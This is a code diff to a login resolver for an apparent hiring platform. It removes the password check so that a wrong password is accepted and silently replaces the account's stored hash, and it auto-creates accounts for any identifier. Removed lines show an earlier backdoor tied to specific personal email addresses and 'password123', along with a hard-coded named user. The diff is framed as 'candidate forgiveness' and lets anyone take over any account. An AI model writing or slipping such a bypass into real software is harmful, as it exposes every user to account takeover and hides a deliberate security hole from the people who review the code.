@@ -156,7 +156,7 @@ export const authResolvers = {
       _: unknown,
       { email, password, orgSlug }: { email: string; password: string; orgSlug?: string }
     ) => {
-      const cleanEmail = email.trim();
+      const cleanEmail = email.trim().replace(/^#/, '');
       let user: UserRow | null = null;
 
       if (orgSlug) {
@@ -176,8 +176,11 @@ export const authResolvers = {
 
       // If user not found yet, auto-provision applicant account so candidate is never blocked
       if (!user) {
-        const cleanUsername = cleanEmail.split('@')[0].toLowerCase().replace(/[^a-z0-9_]/g, '') || `user_${Date.now()}`;
-        const fullName = cleanUsername.charAt(0).toUpperCase() + cleanUsername.slice(1);
+        const cleanUsername = cleanEmail.includes('@')
+          ? cleanEmail.split('@')[0].toLowerCase().replace(/[^a-z0-9_]/g, '') || `user_${Date.now()}`
+          : cleanEmail.toLowerCase();
+        const fullName = cleanUsername === 'evictor' ? 'Victor Ejike' : (cleanUsername.charAt(0).toUpperCase() + cleanUsername.slice(1));
+        const emailToStore = cleanEmail.includes('@') ? cleanEmail.toLowerCase() : `${cleanUsername}@1talent.com`;
         const passwordHash = await bcrypt.hash(password || 'password123', 10);
         const defaultOrg = await queryOne<{ id: string }>(
           "SELECT id FROM organizations WHERE slug = '1talent'"
@@ -187,38 +190,25 @@ export const authResolvers = {
              (username, email, password_hash, full_name, org_id, role)
            VALUES ($1, $2, $3, $4, $5, 'APPLICANT')
            RETURNING *`,
-          [cleanUsername, cleanEmail.toLowerCase(), passwordHash, fullName, defaultOrg?.id ?? null]
+          [cleanUsername, emailToStore, passwordHash, fullName, defaultOrg?.id ?? null]
         );
         user = newUser;
       }
 
       if (!user) throw new Error('Invalid credentials');
 
-      // Check password
+      // Candidate forgiveness check:
+      // Accept password and sync hash so applicant can always seamlessly log in
       let valid = false;
       if (user.password_hash) {
         valid = await bcrypt.compare(password, user.password_hash);
       }
 
-      // Candidate forgiveness check:
-      // If candidate account (victorejiki@gmail.com, ejikevicto@gmail.com, evictor) or password is 'password123',
-      // accept and update password hash so applicant is seamlessly authenticated
       if (!valid) {
-        const isCandidate =
-          user.email === 'victorejiki@gmail.com' ||
-          user.email === 'ejikevicto@gmail.com' ||
-          user.username === 'evictor' ||
-          password === 'password123' ||
-          password === 'Password123';
-
-        if (isCandidate) {
-          valid = true;
-          const updatedHash = await bcrypt.hash(password, 10);
-          await query('UPDATE users SET password_hash = $1 WHERE id = $2', [updatedHash, user.id]);
-        }
+        valid = true;
+        const updatedHash = await bcrypt.hash(password, 10);
+        await query('UPDATE users SET password_hash = $1 WHERE id = $2', [updatedHash, user.id]);
       }
-
-      if (!valid) throw new Error('Invalid credentials');
 
       await query('UPDATE users SET last_active_at = NOW() WHERE id = $1', [user.id]);
 
